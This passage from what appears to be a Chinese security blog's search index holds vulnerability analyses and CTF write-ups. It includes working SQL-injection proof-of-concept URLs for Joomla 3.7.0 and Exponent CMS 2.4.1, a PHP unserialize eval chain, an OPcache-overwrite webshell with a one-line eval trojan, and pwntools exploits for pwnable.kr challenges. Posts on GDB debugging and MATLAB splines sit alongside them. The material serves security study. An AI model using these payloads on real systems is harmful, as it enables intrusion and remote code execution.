&#123; function action() &#123; echo "ph0en1x"; &#125;&#125;class ph0en2x &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;$class6 = new chybeta();unserialize($_GET['test']);?&gt; 本意上，new一个新的chybeta对象后，调用__construct()，其中又new了ph0en1x对象。在结束后会调用__destruct()，其中会调用action()，从而输出 ph0en1x。 下面是利用过程。构造序列化。123456789101112131415&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en2x(); &#125;&#125;class ph0en2x &#123; var $test2 = &quot;phpinfo();&quot;;&#125;echo serialize(new chybeta());?&gt; 得到：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 传给index.php的test参数，利用成功：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析]]></title>
      <url>%2F2017%2F05%2F19%2FCVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Joomla!3.7.0 Core SQL注入漏洞. POC这次干脆先放出poc吧。12345http://localhost:2500/Joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0) 这次根据参数的传入流程来进行分析。 漏洞危害组件3.7.0版本中出现了com_field组件,无需授权即可访问。查看...\components\com_fields\controller.php，在第27行左右，其相关代码如下：12345678910111213141516public function __construct($config = array()) &#123; $this-&gt;input = JFactory::getApplication()-&gt;input; // Frontpage Editor Fields Button proxying: if ($this-&gt;input-&gt;get('view') === 'fields' &amp;&amp; $this-&gt;input-&gt;get('layout') === 'modal') &#123; // Load the backend language file. $lang = JFactory::getLanguage(); $lang-&gt;load('com_fields', JPATH_ADMINISTRATOR); $config['base_path'] = JPATH_COMPONENT_ADMINISTRATOR; &#125; parent::__construct($config); &#125; 可以看到它先判断通过view是否等于fields,layout是否等于modal,而这两个参数都是我们可控的。若满足则将会加载JPATH_ADMINISTRATOR中的com_fields组件，并且将base_path设置为 JPATH_COMPONENT_ADMINISTRATOR，之后调用父类的构造方法。 传入sql语句在调用父类构造方法后，一路运行到...\Joomla370\libraries\legacy\controller\legacy.php中，约莫707行，这时会通过$this-&gt;$doTask调用display()函数。 跟进display()函数，它位于 ...\Joomla370\libraries\legacy\controller\legacy.php，接着运行至legacy.php的约莫671行左右，调用了视图（view）的display()函数。我们跟进一下，跳转进入...\Joomla370\administrator\components\com_fields\views\fields\view.html.php， 此时运行到，下面这条语句，给get()传入的参数为State 1$this-&gt;state = $this-&gt;get('State'); 我们跟进这个get()函数，一直运行到422行， 之后将会调用 getState()，跟进，进入...\Joomla370\libraries\legacy\model\legacy.php 之后会调用filedsModel类中的populateState()，跟进后会发现调用其父类的populateState()函数，其定义在 ...\Joomla370\libraries\legacy\model\list.php中，约莫在第495行，相关代码如下：12345..省略..if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array'))..省略.. 这里我们先跟进一下getUserStateFromRequest()，它的定义在...\Joomla370\libraries\cms\application\cms.php中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了fullordering的值。 在该函数运行完后，流程将会回到前面的那个定义在...\Joomla370\libraries\cms\application\cms.php中的populateState()函数。此时运行的代码如下：12345678910foreach ($list as $name =&gt; $value)&#123; // Exclude if blacklisted if (!in_array($name, $this-&gt;listBlacklist)) &#123; // Extra validations switch ($name)&#123;...&#125; $this-&gt;setState('list.' . $name, $value); &#125;&#125; 如果数组的key不在黑名单（blacklisted）中，将会为$list变量根据相应的State进行注册，在这部分函数运行到结束部分，可以看见成功的控制了list数组的fullordering的值。 查看变量，如下： 注入过程接下来继续运行，一直运行回到Joomla370\administrator\components\com_fields\views\fields\view.html.php中的display()函数中。 跟进这一行 $this-&gt;get(&#39;Items&#39;);，进入...\Joomla370\libraries\legacy\view\legacy.php，约莫在422行,这里的行为跟前面分析类似，此后将会调用getitem()： 继续跟进，进入...\Joomla370\libraries\legacy\model\list.php，约莫在186行：12345try &#123; // Load the list items and add the items to the internal cache. $this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState('list.limit')); &#125; 通过_getList调用了_getListQuery,继续跟进，进入...\Joomla370\libraries\legacy\model\list.php，约莫在 132行，12345if ($lastStoreId != $currentStoreId || empty($this-&gt;query))&#123; $lastStoreId = $currentStoreId; $this-&gt;query = $this-&gt;getListQuery();&#125; 调用了 getListQuery()，继续跟进，进入 ...\Joomla370\administrator\components\com_fields\models\fields.php,一直运行到约莫在 305 行，调用getState方法，传入list.fullordering参数。相关代码如下： 查看变量表： 之后在第314行，将$listOrdering带入查询，相关代码如下：1$query-&gt;order($db-&gt;escape($listOrdering) . ' ' . $db-&gt;escape($orderDirn)); 在进行$query-&gt;order之前，会先进行一次过滤，跟进$db-&gt;escape，进入...\Joomla370\libraries\joomla\database\driver\mysqli.php，约莫242行，相关代码如下：12345678910111213public function escape($text, $extra = false) &#123; $this-&gt;connect(); $result = mysqli_real_escape_string($this-&gt;getConnection(), $text); if ($extra) &#123; $result = addcslashes($result, '%_'); &#125; return $result; &#125; 对于传入的$text通过mysqli_real_escape_string()进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。 成功注入]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一次水水的调试]]></title>
      <url>%2F2017%2F05%2F16%2F%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84GDB%E8%B0%83%E8%AF%95%2F</url>
      <content type="text"><![CDATA[Linux 作业… 编译1gcc -g -O0 array.c main.c -o test 调试1gdb test 通过list命令，可以显示出部分源代码，我们选择在源代码的第9行处下断点。 通过print命令，可以查看变量的值，因为数组名已知，可以如下打印出数组的内容。可以发现，在还没有初始化或者赋值前，数组内容是随机化（或者说是垃圾数据）。 此时程序运行到第9行附近，可以再次通过list命令显示其附近的源代码。 这里为了方便，我们在第11，12，15行下下断点，分别对应两个array_fill_with() 函数 和 array_add()函数。 接下来单步调试，命令是 1gdb-peda$ n 此时在执行完第11行的array_fill_with(),即已经完成了对数组vector_a的赋值后，我们查看下三个数组的值。 数组vector_a全被赋值为10在意料之中（0xa == 10 ），但注意数组vector_b的第一个元素也被赋值为0xa了。在前面可知，数组vector_b的第一个元素原本是0xff00。所以这边可能产生了一个越界。 下一条语句是对数组vector_b进行赋值，这次我们选择进入函数array_fill_with()，即进行step into，gdb中相应的命令为：1gdb-peda$ s 由上图，通过list命令，可知我们已经进入到了array.c中的第七行，正在进行一个循环。其中变量length的值为0x10，即为16。 我们知道，在C语言中，数组下标是从0开始的，这里也就解释了为什么我们再对数组vector_a赋值完后，数组vector_b的第一个元素也被改变了。 接下来我们继续运行程序，命令为：1gdb-peda$ c 此时，已经完成了对数组vector_b的赋值，我们可以推测数组vector_c的第一个元素也会被从原先的 0x0 改为 0x37。事实证明，推测是正确的，见下图： Bug其实重点就一个，C语言中数组下标从0开始的。把array.c中的i &lt;= length 改为 i &lt; length就ok啦。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用PHP的OPcache机制getshell]]></title>
      <url>%2F2017%2F05%2F13%2F%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell%2F</url>
      <content type="text"><![CDATA[OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。本文是对 《binary-webshell-through-opcache-in-php-7》一文的测试。 关于OPcache在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是/var/www/html/opcache，未访问前，opcache文件夹为空。接下去我去访问 index.php后，php会在 opcache文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 index.php所在目录结构相同，同时生成了 index.php.bin。 这个index.php.bin 就是 index.php 的缓存文件。并且作为www-data用户，我们对 5672f68788bcb25b11403b33f5d1497f 具有读写执行权限。这样，我们想办法把这个index.php.bin替换为包含有恶意代码的index.php.bin文件，当我们再次去访问index.php时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。 环境配置php版本12345root@4db5ba2ab3bf:/var/www/html# php -vPHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )Copyright (c) 1997-2017 The PHP GroupZend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies 配置OPcache开启OPcache在php配置文件 php.ini 的约莫 1745 行左右，找到如下配置：1;opcache.enable=0 去掉前面的分号;，将0改为1，如下：1opcache.enable=1 关闭时间戳验证1;opcache.validate_timestamps=1 修改为1opcache.validate_timestamps=0 设置OPcache缓存路径继续向下翻，找到如下配置：1;opcache.file_cache= 这里我修改后的配置是：1opcache.file_cache= &quot;/var/www/html/opcache&quot; 设置缓存文件优先级1;opcache.file_cache_only=0 修改为1opcache.file_cache_only=1 重启apache这里我以apache作为web服务器。1service apache2 resart 重启，使前面修改的php.ini生效 www目录index.php12345678910111213&lt;html&gt; &lt;body&gt; &lt;form action="upload-file.php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;filename:&lt;/label&gt; &lt;input type="file" name="file" id="file" /&gt; &lt;br/&gt; &lt;label for="filepath"&gt;filepath:&lt;/label&gt; &lt;input type="text" name="filepath" id="filepath" /&gt; &lt;br/&gt; &lt;input type="submit" name="submit" value="submit" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; upload-file.php12345678&lt;?php $path = $_POST['filepath']; echo "filename: " . $_FILES["file"]["name"] . "&lt;br /&gt;"; echo "type: " . $_FILES["file"]["type"] . "&lt;br /&gt;"; echo "size: " . ($_FILES["file"]["size"] / 1024) . " Kb&lt;br /&gt;"; move_uploaded_file($_FILES["file"]["tmp_name"], $path . $_FILES["file"]["name"]); echo "save : " . $path . $_FILES["file"]["name"]; ?&gt; 那个。。代码写得很丑。。仅为测试之用：） phpinfo.php123&lt;?php phpinfo();?&gt; getshell现在开始黑盒测试。。 利用phpinfo获取信息 可知，OPcache缓存路径在 /var/www/html/opcache 中。且服务器端开启了 opcache.file_cache_only,禁用了opcache.validate_timestamps。 这是能成功利用的条件。 php7-opcache-override.py由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 hp7-opcache-override.py 来计算。 得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f 构建恶意的缓存文件恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 index.php,内容是一句话木马&lt;?php @eval($_POST[test]);?&gt;，之后访问它。在对应的缓存文件夹里可以看到index.php.bin用十六进制编辑器打开，将OPCACHE.后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下： 覆盖原缓存文件在覆盖之前，先看看服务器上的原缓存文件长啥样： 这里利用上传来进行覆盖。访问index.php,选择修改后的index.php.bin进行上传，上传路径为要覆盖的缓存文件的相对地址 opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/。 上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。 菜刀连上此时再去访问 index.php,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。 CTF前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题 ASIS CTF 2016 – BinaryCloud这题是通过上传来覆盖，但后端有各种过滤。附上writeup ALICTF 2016 - homework这题利用sql注入的dumpfile来实现对缓存文件的覆盖。附上writeup （Author:chybeta）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析]]></title>
      <url>%2F2017%2F05%2F12%2FCVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入 漏洞注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下： 12345678910111213141516171819202122public function api() &#123; if (empty($this-&gt;params['apikey'])) &#123; $_REQUEST['apikey'] = true; // set this to force an ajax reply $ar = new expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access Exponent as a Service', null); $ar-&gt;send(); //FIXME this doesn't seem to work correctly in this scenario &#125; else &#123; $key = expUnserialize(base64_decode(urldecode($this-&gt;params['apikey']))); $cfg = new expConfig($key); $this-&gt;config = $cfg-&gt;config; if(empty($cfg-&gt;id)) &#123; $ar = new expAjaxReply(550, 'Permission Denied', 'Incorrect API key or Exponent as a Service module configuration missing', null); $ar-&gt;send(); &#125; else &#123; if (!empty($this-&gt;params['get'])) &#123; $this-&gt;handleRequest(); &#125; else &#123; $ar = new expAjaxReply(200, 'ok', 'Your API key is working, no data requested', null); $ar-&gt;send(); &#125; &#125; &#125;&#125; api()中，先检测参数apikey 是否为空，若不为空，则进入else分支。在分支中，先对参数apikey进行一次urldecode,接着进行 base64_decode,最后进行一次反序列化expUnserialize，在expUnserialize中存在一次小小的过滤：1234567891011121314function expUnserialize($serial_str) &#123; if ($serial_str === 'Array') return null; // empty array string?? if (is_array($serial_str) || is_object($serial_str)) return $serial_str; // already unserialized// $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str ); $out = preg_replace_callback( '!s:(\d+):"(.*?)";!s', create_function ('$m', '$m_new = str_replace(\'"\',\'\"\',$m[2]); return "s:".strlen($m_new).\':"\'.$m_new.\'";\';' ), $serial_str );// if ($out1 !== $out) &#123;// eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);// &#125; 它会把 经过base64_decode后的$apikey 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行expUnserialize之后，赋值给$key，并在之后实例化一个 expConfig对象。expConfig部分代码如下： 12345678910111213class expConfig extends expRecord &#123; protected $table = 'expConfigs'; function __construct($params=null) &#123; global $db; if (!is_array($params)) &#123; $this-&gt;location_data = serialize($params); parent::__construct($db-&gt;selectValue($this-&gt;table, 'id', "location_data='".$this-&gt;location_data."'")); &#125; else &#123; parent::__construct($params); &#125; .... 在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于selectValue的定义： 123456789101112131415function selectValue($table, $col, $where=null) &#123; if ($where == null) $where = "1"; $sql = "SELECT " . $col . " FROM `" . $this-&gt;prefix . "$table` WHERE $where LIMIT 0,1"; $res = @mysqli_query($this-&gt;connection, $sql); if ($res == null) return null; $obj = mysqli_fetch_object($res); if (is_object($obj)) &#123; return $obj-&gt;$col; &#125; else &#123; return null; &#125;&#125; 可以看到，在检查完$params是否是数组后，将我们传入的$params序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39; 中的单引号进行闭合。 POC1234http://localhost:2500/exponent241/index.php?module=eaas&amp;action=api&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7 其中 base64_decode(“czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7”) = s:16:”aaa’or “‘sleep(2)# 查看 mysql.log ，可以发现成功注入。运行的 sql语句 为： 1SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1 可以看到单引号被成功闭合。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[三次样条插值之MATLAB实现]]></title>
      <url>%2F2017%2F04%2F09%2F%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[三次样条插值之MATLAB实现 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475clear allx = input('输入横坐标，格式:[x1 x2 …… xn]\n')y = input('输入纵坐标，格式:[y1 y2 …… yn]\n')n = length(x);flag = input('请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :');if flag == 1 y1_deri = input('x1 的 一阶导数值：'); yn_deri = input('xn 的 一阶导数值：');else y1_deri = input('x1 的 二阶导数值：'); yn_deri = input('xn 的 二阶导数值：');endfor i = 1 : n-1 h(i) = x(i+1) - x(i);endfprintf('计算 h 结果为:\n');hfor i = 2 : n-1 u(i-1) = h(i-1) / (h(i-1) + h(i)); lamda(i) = h(i) / (h(i-1) + h(i));endif flag == 1 u(n-1) = 1; lamda(1) = 1;else u(n-1) = 0; lamda(1) = 0;endfprintf('计算 μ 结果为: \n');ufprintf('计算 λ 结果为：\n');lamdafor i = 2 : n-1 d(i) = 6 * ((y(i+1)-y(i))/(x(i+1)-x(i)) - (y(i) - y(i-1))/( x(i) - x(i-1)))/(h(i-1)+h(i));endif flag == 1 d(1) = 6 / h(1) * (( y(2)-y(1) )/( x(2) - x(1) ) - y1_deri); d(n) = 6 / h(n-1) * (yn_deri - ((y(n) - y(n-1)) / ( x(n) - x(n-1))));else d(1) = 2 * y1_deri; d(n) = 2 * yn_deri;endfprintf('计算 d 的结果：\n');dmatrix1 = zeros(n,n);for i = 1 : n-1 matrix1(i,i) = 2; matrix1(i,i+1) = lamda(i); matrix1(i+1,i) = u(i);endmatrix1(n,n) = 2;matrix1;fprintf('求得 M 结果:\n');M = matrix1\d'for i = 1 : n-1 clear S syms t k = x(i):0.001:x(i+1); fprintf('区间为[ %.3f : %.3f]\n',x(i),x(i+1)); S = M(i)*(x(i+1)-t)^3/ (6*h(i)) + M(i+1)*(t - x(i))^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - t)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(t - x(i))/h(i) s = M(i)*(x(i+1)-k).^3/ (6*h(i)) + M(i+1)*(k - x(i)).^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - k)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(k - x(i))/h(i); hold on; plot(k,s);end Result测试例题：《计算方法》（李庆扬版）P44 例71234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&gt;&gt; sanciyangtiao输入横坐标，格式:[x1 x2 …… xn][27.7 28 29 30]x = 27.7000 28.0000 29.0000 30.0000输入纵坐标，格式:[y1 y2 …… yn][4.1 4.3 4.1 3.0]y = 4.1000 4.3000 4.1000 3.0000请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :1x1 的 一阶导数值：3.0xn 的 一阶导数值：-4.0计算 h 结果为:h = 0.3000 1.0000 1.0000计算 μ 结果为:u = 0.2308 0.5000 1.0000计算 λ 结果为：lamda = 1.0000 0.7692 0.5000计算 d 的结果：d = -46.6667 -4.0000 -2.7000 -17.4000求得 M 结果:M = -23.5314 0.3960 0.8297 -9.1149区间为[ 27.700 : 28.000]S =(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010区间为[ 28.000 : 29.000]S =(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030区间为[ 29.000 : 30.000]S =(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:random]]></title>
      <url>%2F2017%2F04%2F09%2FPwnable-kr-random%2F</url>
      <content type="text"><![CDATA[伪随机 random先file看一下 IDA打开 可以看到程序读入 v4 ，跟 v5 进行异或操作，若结果为 0xDEADBEEF ，则可以读取到flag。其中 v5的初始值由 rand（）指定。 rand（）rand（）产生伪随机数。伪随机数的“随机”之处是它的种子（seed）。种子确定后，按照一定算法所计算出来的随机数序列也就完全确定了。 C语言中，可以通过 srand() 来指定种子（seed）。如果用户在调用 rand（）之前没有调用过 srand（），则系统默认种子为 1 。测试如下： 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; unsigned int random1; random1 = rand(); printf("No srand():\n"); printf("random1 = %u\n", random1); unsigned int random2; srand(1); random2 = rand(); printf("srand(1):\n"); printf("random2 = %u\n", random2); unsigned int random3; srand(2); random3 = rand(); printf("srand(2):\n"); printf("random3 = %u\n", random3); return 0;&#125; Exp由以上分析可知，v5的值其实是确定的，为 1804289383。而判断条件(v5 ^ v4) == 0xDEADBEEF 等价于 v4 == 0xDEADBEEF ^ v5 。运算可得 1804289383 ^ 0xDEADBEEF = 3039230856。所以我们要给 v4 传入 3039230856 。 1234random@ubuntu:~$ ./random3039230856 Good!Mommy, I thought libc random is unpredictable... FLAG: Mommy, I thought libc random is unpredictable…]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:passcode]]></title>
      <url>%2F2017%2F04%2F08%2FPwnable-kr-passcode%2F</url>
      <content type="text"><![CDATA[简单GOT覆写 passcodemain先file看一下，32位。 用IDA打开，f5 可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。 welcome（） 通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由1int v1; // [sp+18h] [bp-10h]@0 这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。 login（） 这里分别通过1__isoc99_scanf(&quot;%d&quot;) 来获得 passcode1 和 passcode2 的值。要注意的是，这里 scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。 以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数12804857c: 8b 55 f0 mov edx,DWORD PTR [ebp-0x10]804857f: 89 54 24 04 mov DWORD PTR [esp+0x4],edx scanf的第一个参数即 格式化字符串 由下面这两句话传入1238048577: b8 83 87 04 08 mov eax,0x8048783省略8048583: 89 04 24 mov DWORD PTR [esp],eax 0x8048783 处的数据如下：所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。 对于passcode2 的分析同理。 CheckAnalysis从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？ 从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下： 70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。 用peda的checksec检查发现开启了canary保护 由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。 科普：GOTlinux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。 当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。 Thinking通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。 printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下. 对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3 这里对应着login（）中的1return system(&quot;/bin/cat flag&quot;); 梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147） Exp12345678910111213141516171819from pwn import *elf = ELF("passcode")r = remote("127.0.0.1","12345")#r = process("./passcode")printfGotAddr = elf.got["printf"]systemAddr = 134514147print "the printfGotAddr is "+ hex(printfGotAddr)print "the systemAddr is "+ hex(systemAddr)payload1 = 'a' * 96 + p32(printfGotAddr)payload2 = str(systemAddr)r.sendline(payload1)r.sendline(payload2)print r.recv() flaglocal test123456789101112(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE[+] Opening connection to 127.0.0.1 on port 12345: Donethe printfGotAddr is 0x804a000the systemAddr is 0x80485e3flag&#123;2222222222&#125;[*] Closed connection to 127.0.0.1 port 12345 pwnable.kr1234567891011121314151617181920212223242526272829passcode@ubuntu:~$ lsflag passcode passcode.cpasscode@ubuntu:~$ pythonPython 2.7.12 (default, Jul 1 2016, 15:12:24)[GCC 5.4.0 20160609] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)[*] &apos;/home/passcode/passcode&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE&gt;&gt;&gt; r = process(&quot;./passcode&quot;)[x] Starting local process &apos;./passcode&apos;[+] Starting local process &apos;./passcode&apos;: Done&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]&gt;&gt;&gt; systemAddr = 134514147&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)&gt;&gt;&gt; payload2 = str(systemAddr)&gt;&gt;&gt; r.sendline(payload1)&gt;&gt;&gt; r.sendline(payload2)&gt;&gt;&gt; print r.recv()[*] Process &apos;./passcode&apos; stopped with exit code 0Toddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :) FLAG: Sorry mom.. I got confused about scanf usage :(]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:bof]]></title>
      <url>%2F2017%2F04%2F07%2FPwnable-kr-bof%2F</url>
      <content type="text"><![CDATA[简单栈溢出。 bof原题有提供binary和source code。 12(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bofbof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped 用IDA打开，f5: main函数： func函数： func函数接受一个参数（0xDEADBEEF），之后通过gets（）接受输入。因此可以通过栈溢出，将a1覆盖为0xCAFEBABE，这样能直接执行 system(“/bin/sh”) a1 是 func（）的参数，在栈上位于 ebp+8h 的位置。而输入字符串的起点为 ebp-2ch。两者相差：0x2c + 0x8h = 52 。 exp123456from pwn import *p = remote("pwnable.kr","9000")payload = 'a' * 52payload += p32(0xcafebabe)p.sendline(payload)p.interactive() flag]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[《The Pracetice of Programming》读书笔记（1）]]></title>
      <url>%2F2017%2F04%2F06%2F%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89%2F</url>
      <content type="text"><![CDATA[《The Pracetice of Programming》读书笔记 Style Usually,the real code is mostly well down,but with something that could be improved. There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough. The principles of programming style are based on common sense guided by experience. Names labels an object and conveys information about its purpose. informative、concise、memorable, and pronounceable if possible the border the scope,the more information conveyed. suggestion 1use descriptive name for globals,short names for locals.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用python为1000php生成目录页面]]></title>
      <url>%2F2017%2F04%2F03%2F%E5%88%A9%E7%94%A8python%E4%B8%BA1000php%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2%2F</url>
